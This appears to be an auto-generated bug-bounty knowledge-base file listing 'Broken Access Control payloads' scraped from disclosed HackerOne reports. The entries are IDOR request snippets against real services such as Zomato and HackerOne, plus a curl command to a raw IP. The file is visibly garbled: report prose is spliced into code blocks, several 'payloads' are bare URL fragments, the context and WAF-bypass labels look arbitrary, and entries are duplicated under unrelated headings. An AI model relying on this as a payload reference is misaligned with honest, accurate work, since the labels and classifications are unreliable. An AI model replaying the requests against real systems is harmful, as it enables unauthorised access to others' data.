---
vuln_type: "Broken_Access_Control"
file_type: "payloads"
total_reports: "470"
avg_bounty: "1128"
max_bounty: "10000"
severity_distribution: "critical:10% high:10% medium:10% low:70%"
owasp_categories: ["A01:2021"]
common_cwe: ["CWE-000"]
last_updated: "2026-04-09"
tags: ["Broken_Access_Control", "web", "api", "A01", "hunter-kb"]
related_vulns: ["Information_Disclosure", "SSRF"]
---


# Broken Access Control — Payloads

 This payload structure operates reliably against standard implementations lacking modern security boundaries or active request filtering components.

> [!TIP]
> Always iterate. Test a canary token to figure out parsing logic, then increment to full payload structures.

> [!WARNING]
> Execute payloads explicitly only against authorized systems in accordance with program SLA scopes.

## Basic Payloads

#### Payload 1

```javascript
://hackers.upchieve.org/
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1004750](https://hackerone.com/reports/1004750)

#### Payload 2

```javascript
`
POST /graphql HTTP/2
Host: hackerone.com
Cookie: yourcookie
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer:... This report describes a Broken_Access_Control issue affecting the target application surface. The disclosed finding is titled "Insecure Direct Object Reference..." and indicates exploitable input handling weaknesses. Observed report context: **Summary:** Hi Team, I think I can delete any Campaigns based on campaign_id ### Steps To Reproduce Follow the POST request below
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1026146](https://hackerone.com/reports/1026146)

## Context-Specific Payloads

#### Payload 3

```javascript
{"operationName":"LockReport","variables":{"product_area":"reports","product_feature":"inbox","reportId":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTIyNjcx"},"query":"mutation LockReport($reportId: ID!) {\n  ... This report describes a Broken_Access_Control issue affecting the target application surface. The disclosed finding is titled "IDOR: Authorization Bypass in..." and indicates exploitable input handling weaknesses. Observed report context: **Summary:** Hello team, I can lock any public report. ### Steps To Reproduce 1. Using your account, make this request. Notice its successful. Report id is the id of any public report.
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1048540](https://hackerone.com/reports/1048540)

#### Payload 4

```javascript
POST /AJAXUtilities.aspx HTTP/1.1
Host: ████████
Content-Length: 73
Sec-Ch-Ua: "Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"
Accept: text/plain, */*; q=0.01
Content-Type: application/x-www-form-urlencoded;... This report describes a Broken_Access_Control issue affecting the target application surface. The disclosed finding is titled "IDOR to delete profile..." and indicates exploitable input handling weaknesses. Observed report context: Hi Team! When I was testing the https:█████████/userprofile.aspx discovered that pictures added were being deleted with a get request like so:
```

**Context:** URL parameter
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1060837](https://hackerone.com/reports/1060837)

## Advanced Payloads

#### Payload 5

```javascript
curl --insecure https://52.90.28.77:30920/reddit --header "Host: █████████"
```

**Context:** JSON body
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1061736](https://hackerone.com/reports/1061736)

#### Payload 6

```javascript
.hostinger.com
```

**Context:** HTTP header
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1063022](https://hackerone.com/reports/1063022)

## WAF Bypass Payloads

#### Payload 7

```javascript
GET /php/client_manage_handler?res_id=REDACTED&photo_ids%5B%5D=r_YxNDUOTE4MTYzO&removable=1&case=remove-active-photo HTTP/1.1
Host: www.zomato.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101... This report describes a Broken_Access_Control issue affecting the target application surface. The disclosed finding is titled "IDOR to delete images from other..." and indicates exploitable input handling weaknesses. Observed report context: When I was testing the restaurant manager specific endpoints on Zomato I discovered that pictures added were being deleted with a get request like so:
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1063164](https://hackerone.com/reports/1063164)

## Encoding & Obfuscation

#### Payload 8

```javascript
POST /reports/export HTTP/1.1
Host: localhost:8080
...

----------868143055
Content-Disposition: form-data; name="report_ids[]"

17
----------868143055
Content-Disposition: form-data; name="report_ids[]"

118
...
```

**Context:** JSON body
**Bypasses:** WAF / Input Validation Filter
**Framework:** Framework-agnostic
**Source:** [Report #1064869](https://hackerone.com/reports/1064869)

## Polyglot Payloads

#### Payload 9

```javascript
POST /apps/deck/cards HTTP/1.1
[...]

{"title":"SOME_TEST","stackId":1,"type":"plain"}
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1066203](https://hackerone.com/reports/1066203)

## Blind / Out-of-Band Payloads

#### Payload 1

```javascript
://hackers.upchieve.org/
```

**Context:** URL parameter
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1004750](https://hackerone.com/reports/1004750)

## Chained Payloads

#### Payload 9

```javascript
POST /apps/deck/cards HTTP/1.1
[...]

{"title":"SOME_TEST","stackId":1,"type":"plain"}
```

**Context:** HTTP header
**Bypasses:** No special bypass needed
**Framework:** Framework-agnostic
**Source:** [Report #1066203](https://hackerone.com/reports/1066203)


